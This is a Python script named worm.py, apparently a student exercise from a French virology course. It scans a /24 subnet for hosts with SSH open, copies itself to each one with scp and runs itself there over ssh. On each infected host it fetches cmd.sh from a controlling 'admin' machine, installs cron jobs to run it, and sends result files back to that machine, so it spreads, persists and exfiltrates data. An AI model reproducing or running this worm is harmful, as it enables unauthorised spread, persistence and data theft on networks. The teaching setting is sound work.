import os
import sys
import socket
import subprocess

PORT=22
#En ligne de commande :
#Sur les deux machines : ssh-keygen
#ssh-copy-id pierre@192.168.56.101
#ssh-add
def connectSock(listIP):
    IP=[]
    for ip in listIP:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.settimeout(0.1)
            s.connect((ip, PORT))
            print "Connected to : "+ip
            IP.append(ip)
            s.close()
        except:
            s.close()
            continue
    return IP

def isAdmin():
    command ="ip a show eno1 |grep inet |tr -s ' '|cut -d ' ' -f 3 | awk 'NR==1'"
    cmd = os.popen(command)
    ipEno1 = cmd.read()
    if ipEno1!="10.0.4.43/24\n":
        return False
    return True

if __name__=="__main__":
        listeIp = []
        for i in range(2,255):
            listeIp.append("192.168.56."+str(i))

        if isAdmin():
            listIP = connectSock(listeIp)
            for elt in listIP:
                 cmd = "scp "+sys.argv[0]+" pierre@"+elt+":~"
                 os.system(cmd)
                 cmd = "ssh pierre@"+elt+" python worm.py"
                 os.system(cmd)
        else:
             out = subprocess.check_output(['ls','-la'])
             if "novirus.txt" not in out:
                 subprocess.call(['scp','pierre@10.0.4.43:~/Documents/Virologie/cmd.sh', '/home/pierre/'])
                 subprocess.call(['touch','/tmp/crontemp.txt'])
                 os.system('echo \"45 16 * * * ./cmd.sh\" >> /tmp/crontemp.txt')
                 os.system('echo \"45 16 * * * scp /tmp/name/To_send* pierre@10.0.4.43:~\" >> /tmp/crontemp.txt')
                 subprocess.call(['crontab','/tmp/crontemp.txt'])
                 subprocess.call(['rm', '/tmp/crontemp.txt'])
             else:
                 subprocess.call(['rm', 'worm.py'])

# |-> Si Machine Admin (Ma machine)
#   |-> Liste @IP alive (p22)
#   |-> Colonisation
#   |-> Execution du Virus
# |-> Sinon (Pas Admin)
#   |-> Si Autorise (pas de no.txt)
#     |-> CronTab Virus (1 fois)
#     |-> Download CMD File (cherche fichier sur serveur admin)
#     |-> Execution du CMD (dans crontab etat du processeur)
#     |-> Send Reslutats -> Admin Host (renvoyer le resultat)
# |-> Sinon
#     |-> Remove (condition pour revert remove tout)


#Si ma machine, liste ip, colonise ma machine, envoie du virus (colonisation machine attaquee?)
#Si c'est pas ma machine alors on ecrit dans CronTab ensuite on va cherche fichier CMD sur serveur admin
#ensuite on execute le CMD qui doit donner l'etat du processeur et le renvoyer
#Dans quel condition on efface tout ??
